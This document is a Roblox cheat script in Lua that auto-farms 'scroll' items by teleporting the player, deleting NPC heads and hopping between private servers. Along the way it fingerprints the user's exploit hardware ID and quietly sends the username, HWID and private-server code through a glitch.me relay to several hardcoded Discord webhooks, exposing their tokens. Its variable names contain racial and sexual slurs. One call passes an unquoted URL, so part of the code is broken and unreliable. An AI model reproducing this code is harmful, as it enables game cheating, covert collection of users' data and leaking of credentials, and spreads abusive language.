repeat wait() until game:IsLoaded()
wait(waitz)
skip = false
zigger = false
local whore = Vector3.new(0, -40000, 0)
local bodyvelocityenabled = true -- set this to false if you are getting kicked

local function JINKILL()
    for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
        if v.Name == "npc1" and v:FindFirstChild("HumanoidRootPart") and v.HumanoidRootPart.Position.Y > -1000 then
                    v.Head:Destroy()
        end
    end
end

local Imput = game:GetService("UserInputService")
local http_request = http_request;
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
return {
StatusCode = 200;
Body = request(tb.Url, tb.Method, (tb.Body or ''))
}
end
end


if game.Workspace:FindFirstChild("CCoff") then
	game.Workspace:FindFirstChild("CCoff"):Destroy()
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwidz = "";

for i, v in next, hwid_list do
if decoded.headers[v] then
hwidz = decoded.headers[v];
break
end
end


local function log(name, message, hook)
 local api = "http://buritoman69.glitch.me/webhook" -- credits to owner
 local Body = {
   ['Key'] = "applesaregood", -- api owner's apikey
   ['Message'] = tostring(message),
   ['Name'] = tostring(name),
   ['Webhook'] = tostring(hook)
 }
 local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
 return data or nil
end
local wh = "https://discordapp.com/api/webhooks/766281274159005747/naddjrmiwSh336SrcGkhcutJ84XVzMulRuzDh2BVfOtMSETgv5lm4TpeFdkwKT2dwbpk"

local blacklisted_hwids = {
                         "z", "Hwid2", "Hwid3"
                          }

local body = http_request({Url = 'https://creativehell.xyz/api/gethwid.php'; Method = 'GET'}).Body;
local json_decode = game:GetService('HttpService'):JSONDecode(body)
local Fingerprnit_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, Fingerprnit_list do
    if json_decode[v] then
    for i1, v1 in next, blacklisted_hwids do
        if  v1 == json_decode[v] then
           print('BlackListed');
           log("blacklisted", "***" .. hwidz .. "***" ..  "* Username:  " .. game.Players.LocalPlayer.Name , wh);
           game:Shutdown()
        end
    end
    end
end
local Plr = game.Players.LocalPlayer
local Mouse = Plr:GetMouse()
local Plr = game.Players.LocalPlayer
function To(position)
local Chr = Plr.Character
if Chr ~= nil then
local ts = game:GetService("TweenService")
local char = game.Players.LocalPlayer.Character
local hm = char:WaitForChild("HumanoidRootPart")
local dist = (hm.Position - Mouse.Hit.p).magnitude
local tweenspeed = dist/tonumber(speed)
local ti = TweenInfo.new(tonumber(tweenspeed), Enum.EasingStyle.Linear)
local tp = {CFrame = CFrame.new(position)}
ts:Create(hm, ti, tp):Play()
-- senpai was here
if bodyvelocityenabled == true then
local bv = Instance.new("BodyVelocity")
bv.Parent = hm
bv.MaxForce = Vector3.new(100000,100000,100000)
bv.Velocity = Vector3.new(0,0,0)
wait(tonumber(tweenspeed))
bv:Destroy()
end
end
end
local HttpService = game:GetService("HttpService");



game.StarterGui:SetCore("SendNotification", {
Title = "hi";
Text = "Senpai was here. :3";
Icon = "";
Duration = 30;
})
game.StarterGui:SetCore("SendNotification", {
Title = "Discord";
Text = "Senpai.#4900";
Icon = "";
Duration = 30;
})

	for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
	    if v.ClassName == "Model" then 
	        if table.find(getgenv().ignore, v.Name) then
	            zigger = true
			log("skipped", "***" .. " Skipped:  " .. v.Name .. "***" , https://discord.com/api/webhooks/767052037250482186/HKM9_Sf94HL4eEw1Z2LXtFsfTwUZePcWBtyeYXRFOVYlbEVwYFpHFBJhJnK348e79P46);
	        elseif not table.find(getgenv().ignore, v.Name) then
                zigger = false
                else 
                    zigger = true
	        end
	    end
        end

local plr = game.Players.LocalPlayer
if _G.monkey == true then
	local nigger = {}
	for i,v in pairs(game.Players.LocalPlayer.statz.unlocked:GetChildren()) do
		if v.ClassName == "StringValue" then
			table.insert(nigger, v.Name)	
		end
	end
	for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
	    if v.ClassName == "Model" then
	        if table.find(nigger, v.Name) then
		        warn("You own "..v.Name..".. Skipping")
		    	skip = true
		    elseif not table.find(nigger,v.Name) then
		        warn("You don't own "..v.Name..".. Hunting")
		        skip = false
		    end
	    else 
	        skip = true
	    end
	end
end
for i=1, 5 do 
    wait()
for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
    if not game.workspace.GLOBALTIME:FindFirstChildOfClass("Model") or skip or zigger then
        game.Players.LocalPlayer:WaitForChild("startevent"):FireServer("createprivateserver", _G.placetp)
     game.Players.LocalPlayer:WaitForChild("startevent"):FireServer("createprivateserver", _G.placetp)
   else
       
       if v:IsA("Model") and v.sh.Position ~= whore then
       warn("real scroll found")
       warn(v.sh.Position)
       warn(v.Name)
       To(v.sh.Position)
       repeat wait() until game.Players.LocalPlayer.Character.HumanoidRootPart.Position == v.sh.Position
       JINKILL()
       fireclickdetector(v.sh.ClickDetector)
       local name = game.Players.LocalPlayer.Name
       local http_request = http_request;
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
return {
StatusCode = 200;
Body = request(tb.Url, tb.Method, (tb.Body or ''))
}
end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
if decoded.headers[v] then
hwid = decoded.headers[v];
break
end
end


local function log(name, message, hook)
 local api = "http://buritoman69.glitch.me/webhook" -- credits to owner
 local Body = {
   ['Key'] = "applesaregood",
   ['Message'] = tostring(message),
   ['Name'] = tostring(name),
   ['Webhook'] = tostring(hook)
 }
 local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
 return data or nil
end
local wh = "https://discordapp.com/api/webhooks/756045703045709866/D4SClZ7YmAo3fMWJIiotKOxwhMLr31CFtPWIorJsKlX4Q-C1aRFGKnb6WTrN62m4YHJD"
function SendMessage(Webhook, Message, Botname)
    if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
        return error("Send a valid URL");
    end
    local Name;
    local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
    local API = "http://buritoman69.glitch.me/webhook";
    if (not Message or Message == "" or not Botname) then
        Name = "GameBot"
        return error("nil or empty message!")
    else
        Name = Botname;
    end
    local Body = {
        ['Key'] = tostring("applesaregood"),
        ['Message'] = tostring(Message),
        ['Name'] = Name,
        ['Webhook'] = Webhook    
    }
    Body = HttpService:JSONEncode(Body);
    local Data = game:HttpPost(API, Body, false, "application/json")
    return Data or nil;
end
local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
        SendMessage("https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_", "***".. " SNIPED: "  ..   v.Name  ..  monkeyzzz  .. "***", "Senpai And Hentai Winning")
       SendMessage("https://discordapp.com/api/webhooks/766006562380054528/oOWi34rOjuqYi4mi86ZssDCUXfZXMoJsRX-FHYwNjDUJf9iABLbvbPf2Q6OfYDR158SA", "***" .. name .. " sniped ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
       game.StarterGui:SetCore("SendNotification", {
Title = "scroll sniped";
Text = "sniped: " ..  v.Name;
Icon = "";
Duration = 120;
})
end
end
end
end
